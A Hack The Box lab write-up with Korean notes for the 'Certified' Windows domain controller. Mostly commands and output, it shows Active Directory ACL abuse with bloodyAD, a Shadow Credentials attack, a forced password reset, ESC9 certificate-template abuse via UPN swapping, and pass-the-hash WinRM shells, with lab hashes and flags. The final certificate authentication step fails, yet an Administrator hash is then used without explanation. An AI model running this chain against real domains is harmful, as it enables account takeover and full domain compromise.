---
tags:
  - type/machine
  - platform/htb
  - os/windows
  - status/solved
  - tech/ad/adcs
  - tech/ad/acl-abuse
  - tech/ad/shadow-cred
  - tech/ad/bloodhound
  - tech/svc/smb
  - tech/exec/winrm
type: machine
platform: htb
os: windows
ip: 10.129.231.186
domain: certified.htb
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3269, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, msrpc, ncacn_http, netbios-ssn, ssl/ldap]
status: solved
tech_count: 6
---
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.231.186 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 11:22 +0900
Nmap scan report for 10.129.231.186
Host is up (0.25s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-14 09:23:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-14T09:24:40+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-03-14T09:24:41+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-03-14T09:24:41+00:00; +6h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
49733/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2026-03-14T09:24:01
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   248.59 ms 10.10.14.1
2   249.09 ms 10.129.231.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.75 seconds

```

HOSTS 정보수집
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ nxc smb 10.129.231.186 --generate-hosts-file hosts 
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)

```

hosts 파일 설정
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ cat hosts            
10.129.231.186     DC01.certified.htb certified.htb DC01
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ cat hosts | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.231.186     DC01.certified.htb certified.htb DC01
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ cat /etc/hosts                    
127.0.0.1       localhost
10.129.231.186     DC01.certified.htb certified.htb DC01

```

Bloodhound 정보 수집
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodhound-python -d 'certified.htb' -u 'judith.mader' -p 'judith09' -ns 10.129.231.186 -c All --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 47S
INFO: Compressing output into 20260314115819_bloodhound.zip

```

### Initial Access
주어진 자격증명으로 SMB 인증 성공`judith.mader:judith09`
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ nxc smb 10.129.231.186 -u 'judith.mader' -p 'judith09' 
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
```

![[Pasted image 20260314120414.png]]

Management 그룹 소유자를 judith.mader 로 변경
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodyAD -d 'certified.htb' -u 'judith.mader' -p 'judith09' --host 'certified.htb' set owner Management judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on Management

```

Management 그룹에 대해 judith.mader 계정에 GenericAll 권한 추가
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodyAD -d 'certified.htb' -u 'judith.mader' -p 'judith09' --host 'certified.htb' add genericAll Management judith.mader
[+] judith.mader has now GenericAll on Management

```

Management 그룹에 judith.mader 추가
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodyAD -d 'certified.htb' -u 'judith.mader' -p 'judith09' --host 'certified.htb' add groupMember Management judith.mader
[+] judith.mader added to Management

```

Shadow Credentials attack을 수행하여 management_svc 계정 NTLM 해시 획득
`a091c1832bcdd4677c28b5a6a1295584`

```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ sudo rdate -n 10.129.231.186                  
[sudo] password for kali: 
Sat Mar 14 19:10:20 KST 2026
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'management_svc' -target 10.129.231.186   
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd9fad4e6e8dc4c22b89ed6c56a65666a'
[*] Adding Key Credential with device ID 'd9fad4e6e8dc4c22b89ed6c56a65666a' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'd9fad4e6e8dc4c22b89ed6c56a65666a' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

획득한 해시를 사용하여 management_svc 계정으로 SMB 인증 성공
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ nxc smb 10.129.231.186 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' 
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584

```

management_svc 계정으로 WinRM 인증 
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ evil-winrm -i 10.129.231.186 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> 

```

user.txt 획득
```bash
*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
80cf6387a7a55cc1426ef241c85cb750
*Evil-WinRM* PS C:\Users\management_svc\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.231.186
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

```


### Privilege Escalation

![[Pasted image 20260314121845.png]]
CA_OPERATOR 계정 비밀번호를 “a123a123”로 변경

```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodyAD -d 'certified.htb' -u 'management_svc' -p ':a091c1832bcdd4677c28b5a6a1295584' --host 'certified.htb' set password CA_OPERATOR a123a123
[+] Password changed successfully!

```

certipy 취약점 스캔
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ certipy-ad find -vulnerable -u ca_operator -p a123a123 -dc-ip 10.129.231.186 -target-ip 10.129.231.186
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260314201439_Certipy.txt'
[*] Wrote text output to '20260314201439_Certipy.txt'
[*] Saving JSON output to '20260314201439_Certipy.json'
[*] Wrote JSON output to '20260314201439_Certipy.json'

```

CertifiedAuthentication 템플릿에서 ESC9 취약점 발견
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ cat 20260314201439_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.

```

GenericAll 권한을 가진 management_svc 계정을 사용하여 ca_operator 계정의 UPN을 Administrator로 변경
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ certipy-ad account update -u 'management_svc' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -user 'ca_operator' -upn 'Administrator'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

ESC9 템플릿(인증 인증)에서 "ca_operator" 사용자로 인증서를 요청

```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ certipy-ad req -u 'ca_operator' -p 'a123a123' -dc-ip 10.129.231.186 -target 'certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

ca_operator UPN 원복
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ certipy-ad account update -u 'management_svc' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -user 'ca_operator' -upn 'ca_operator.certified.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator.certified.htb
[*] Successfully updated 'ca_operator'

```

대상 관리자로 인증되어 관리자의 NTLM hash 획득
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'certified.htb' -dc-ip 10.129.231.186
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information

```


획득한 administrator NTLM 해시로 WinRM 접속
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ evil-winrm -i 10.129.231.186 -u 'administrator' -H '0d5b49608bbce1751f708748f67e2d34'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

root.txt 획득
![[Pasted image 20260314132809.png]]